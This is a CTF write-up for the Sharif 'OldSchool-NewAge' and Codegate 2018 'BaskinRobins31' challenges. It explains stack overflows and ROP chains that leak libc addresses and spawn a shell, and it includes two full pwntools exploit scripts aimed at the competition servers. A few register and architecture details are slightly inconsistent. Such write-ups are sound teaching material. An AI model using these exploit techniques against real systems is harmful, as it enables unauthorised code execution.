---
layout: post
title: "[Write-Up] Codegate 2018 preliminary CTF / SharifCTF 8"
categories: [write-up]
tags: [pwn]
description: Write-Up on the challenges "BaskinRobins31" and "OldSchool-NewAge" of the Codegate preliminary and Sharif CTF. This Write-Up will show you two ways to solve a Return Oriented Programming, with and without having access to the LibC.
---

# Surroundings
This week-end took place the [Codegate preliminary](https://quals.codegate.kr) and the [Sharif](http://ctf.sharif.edu) CTF. This Write-Up is going to show you how to solve the first pwnable challenges of both CTF. Both challenges must be solved using the Return Oriented Programming technique but for the Codegate one, the binary is provided without having access to the LibC compare to the Sharif one. I am going to show you two techniques to solve both challenges.

This Write-Up is divided into two parts:
1. [OldSchool-NewAge](/write-up/2018/02/04/write_up_codegate_sharif.html#oldschool-newage), Sharif CTF
1. [BaskinRobins31](/write-up/2018/02/04/write_up_codegate_sharif.html#baskinrobins31), Codegate preliminary CTF

# OldSchool-NewAge
For this challenge we have a binary which is provided with the LibC used on the remote server. Let first begin by take a look to the given binary:

![Check_binary](/assets/media/sharif_check_binary.png)

From this, we can get the following informations:
- The only enabled protection is "No eXecutable".
- The binary is dynamically linked.
- The binary is compiled for an x86 architecture.

Let's try to run it to have a better idea of the binary behaviour:

![Start binary](/assets/media/sharif_segv_binary.png)

The binary ask for something on input and print some text on its output. Its easy to get a Segmentation fault, we just have to send a huge string on input.

Let's disassemble it with IDA to know why we got this SegV:

![Copy_it](/assets/media/sharif_copy_it.png)

The binary first begin by reading 200 bytes on its input using fgets() and then it copies the bytes read into a buffer. On the last screenshot you can see the copy_it() function which copy the bytes read into the destination buffer using strcpy(). But the destination buffer only has a size of 18 bytes so we can easily overwrite the saved RIP address.

As the binary is compiled in 32 bits, I could brute-force the base address of the LibC to call system() but I choose another method which used the Return Oriented Programming method.

The method is composed of 3 parts:
- We are going to begin by leaking an address to defeat the ASLR
- Then we are going to return to main()
- Then we are going to do a classic "Ret to LibC"

To leak one LibC address, we are going to use the puts() function which is in the ".plt" section. We will give it one GOT entry as first argument, for example the GOT address of strcpy(). To edit puts() first argument we will use one gadget which pop one value into RDI register. After did that we are going to return to main() using it address.

The whole payload for the two first part look like this:
```bash
+------------+------------+------------+------------+
|            |            |            |            |
|  pop rdi   |  GOT_ADDR  |  puts_plt  |   main()   |
|            |            |            |            |
+------------+------------+------------+------------+
```

Now that we leak our address, it is easy to calculate the LibC base address, the system() address and the "/bin/sh" address.

The last step is to overwrite the saved RIP with our last gadget "pop rdi" to pop the address of "/bin/sh" and then call system().
The ropchain look like this:
```bash
+------------+------------+------------+
|            |            |            |
|  pop rdi   |  /bin/sh   |  system()  |
|            |            |            |
+------------+------------+------------+
```

The whole exploit look like this:
```python
#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


context(arch="i386", os="linux", endian="little")


class Pwn:
    def __init__(self):
        self.e = ELF("./vuln4")
        self.libc = ELF("./libc.so.6")
        self.p = None

    def leak_addr(self):
        rop = ROP([self.e])
        main = self.e.symbols['main']
        puts_plt = self.e.plt['puts']
        puts_got = self.e.got['strcpy']

        rop.raw("A" * 21)
        rop.raw(p32(puts_plt))
        rop.raw(p32(main))
        rop.raw(p32(puts_got))

        self.p.sendline(str(rop))
        data = self.p.recvuntil("yourself\n")
        data = data[:4]
        print "[x] Leak " + str(len(data)) + " bytes at " + hex(puts_got) + " : " + ":".join("{:02x}".format(ord(c)) for c in data)
        return u32(data)

    def start_binary(self):
        self.p = remote("ctf.sharif.edu", 4801)
        self.p.recvuntil("yourself\n")

    def execute_system(self, leak_binsh, leak_system):
        rop = ROP([self.e])

        rop.raw("A" * 21)
        rop.raw(p32(leak_system))
        rop.raw(p32(leak_system))
        rop.raw(p32(leak_binsh))

        self.p.send(str(rop))
        self.p.interactive()
        self.p.close()

    def pwn_binary(self):
        self.start_binary()
        leak_system = self.leak_addr() - 0x4c070
        leak_binsh = leak_system + 0x120c6b
        self.execute_system(leak_binsh, leak_system)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
```

Let's try it:

![Sharif pwn](/assets/media/sharif_2k18_flag.png)

Done.

You can find the binary and the exploit [here](https://github.com/meffre-q/ctf/tree/master/sharif_2k18/pwn/OldSchool-NewAge).

# BaskinRobins31
This challenges is very similar to the last one but this time the LibC was not provided with the binary.

Let first begin by checking our binary:

![Binary check](/assets/media/codegate_check_binary.png)

We can get the following informations:
- The binary is compiled for an AMD64 architecture.
- The binary is dynamically linked.
- The binary has both "No eXecutable" and "Partial REad onLy RelOcation" protections enabled.

Let's run the binary to take a look at the binary's behaviour:

![Binary test](/assets/media/codegate_segv.png)

As in the first challenge, the segmentation fault is easy to trigger.

Let's disassemble it to know what's happened:

![Binary disassemble](/assets/media/codegate_your_turn.png)

The vulnerability is located in your_turn(). As you can see, this function read 400 bytes on its input and store them into a buffer which has a size of 176 bytes. So it is easy to overwrite the saved RIP on the stack.

As I said earlier, the LibC is not provided for this challenge, so we can't know the system() offset to call it. As we can read where we want, we can try to guess it but it is not funny. (After looked the other write-up, it is possible to find the LibC version using this [tools](https://libc.blukat.me/)) We have access to both read() and write() functions, so we are able to read and write wherever we want. To get a shell we are going to use syscalls to execute execve with the string "/bin/sh" as first argument.

The exploit is divided into 4 parts:
- Find one syscall instruction.
- Write "/bin/sh" into memory.
- Set RAX to 0x3b (execve syscall number).
- Execute execve("/bin/sh")

To begin, we must find one "syscall" instruction to be able to execute "execve". read() is in the ".got" section so we can easily leak its address.

That is the beginning of read():

![Read function](/assets/media/codegate_read_func.png)

There is a "syscall" instruction at read() + 0xe bytes. We are going to use it for our exploit.

Now we are going to write "/bin/sh" into the memory. This part is very easy as we have write() we will simply write our strings into the ".data" section.

Before execute the syscall, we have to set RAX to 0x3b otherwise we can't execute execve(). To do it, I used read() which set RAX to the number of read bytes so we just have to send 0x3b to it and then pop the right address into the right register for the argument.

The final ropchain look like this:
```bash
+------------+-------------------+------------+------------+------------+------------>
|            |                   |            |            |            |            >
|   offset   |  POP_RDI_RSI_RDX  |     0x0    | .data+0x10 |    0x3b    |   read()   >
|            |                   |            |            |            |            >
+------------+-------------------+------------+------------+------------+------------>

<-------------------+------------+------------+------------+------------+
<                   |            |            |            |            |
<  POP_RDI_RSI_RDX  |   .data    |    0x0     |     0x0    |   syscall  |
<                   |            |            |            |            |
<-------------------+------------+------------+------------+------------+
```

The whole exploit look like this:
```python
#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


context(arch="i386", os="linux", endian="little")

class Pwn:
    def __init__(self):
        self.e = ELF("./BaskinRobins31")
        self.offset = 184
        self.p = None

    def start_binary(self):
        self.p = remote("ch41l3ng3s.codegate.kr", 3131)
        self.p.recvuntil("(1-3)\n")

    def read_addr(self, addr, data):
        rop = ROP([self.e])
        main = self.e.symbols['main']
        read_plt = self.e.plt['read']
        pop_rdi_rsi_rdx = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]

        rop.raw("A" * self.offset)
        rop.raw(p64(pop_rdi_rsi_rdx))
        rop.raw(p64(0x0))
        rop.raw(p64(addr))
        rop.raw(p64(len(data)))
        rop.raw(p64(read_plt))
        rop.raw(p64(main))

        self.p.sendline(str(rop))
        self.p.recvuntil("rules...:( \n")
        self.p.send(data)
        print "[x] Write " + str(len(data)) + " bytes at " + hex(addr) + " : " + data
        self.p.recvuntil("(1-3)\n")

    def write_addr(self, addr, size):
        rop = ROP([self.e])
        main = self.e.symbols['main']
        write_plt = self.e.plt['write']
        pop_rdi_rsi_rdx = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]

        rop.raw("A" * self.offset)
        rop.raw(p64(pop_rdi_rsi_rdx))
        rop.raw(p64(0x1))
        rop.raw(p64(addr))
        rop.raw(p64(size))
        rop.raw(p64(write_plt))
        rop.raw(p64(main))

        self.p.sendline(str(rop))
        self.p.recvuntil("rules...:( \n")
        data = self.p.recvline()
        data = data[:6]
        print "[x] Leak " + str(len(data)) + " bytes at " + hex(addr) + " : " + ":".join("{:02x}".format(ord(c)) for c in data)
        self.p.recvuntil("(1-3)\n")
        return u64(data+"\x00"*2)

    def execute_syscall(self, syscall_addr):
        rop = ROP([self.e])
        pop_rdi_rsi_rdx = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
        data_addr = self.e.get_section_by_name(".data").header.sh_addr
        read_plt = self.e.plt['read']

        rop.raw("A" * self.offset)
        rop.raw(p64(pop_rdi_rsi_rdx))
        rop.raw(p64(0x0))
        rop.raw(p64(data_addr+0x10))
        rop.raw(p64(0x3b))
        rop.raw(p64(read_plt))
        rop.raw(p64(pop_rdi_rsi_rdx))
        rop.raw(p64(data_addr))
        rop.raw(p64(0x0))
        rop.raw(p64(0x0))
        rop.raw(p64(syscall_addr))

        self.p.send(str(rop))
        self.p.recvuntil("rules...:( \n")
        self.p.send("A"*0x3b)
        self.p.interactive()
        self.p.close()

    def pwn_binary(self):
        self.start_binary()

        syscall_addr = self.write_addr(self.e.got['read'], 0x8) + 0xe
        print "[*] Find syscall gadget at:" + hex(syscall_addr)
        self.read_addr(self.e.get_section_by_name(".data").header.sh_addr, "/bin/sh\x00")
        print "[*] Write string \"/bin/sh\x00\" at:" + hex(self.e.get_section_by_name(".data").header.sh_addr)
        self.execute_syscall(syscall_addr)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
```

Let's try it:

![Binary pwn](/assets/media/codegate_2k18_flag.png)

Done.

You can find the binary and the exploit [here](https://github.com/meffre-q/ctf/tree/master/codegate_quals_2k18/pwn).

Thanks to Sharif/Codegate for this great challenges! :)
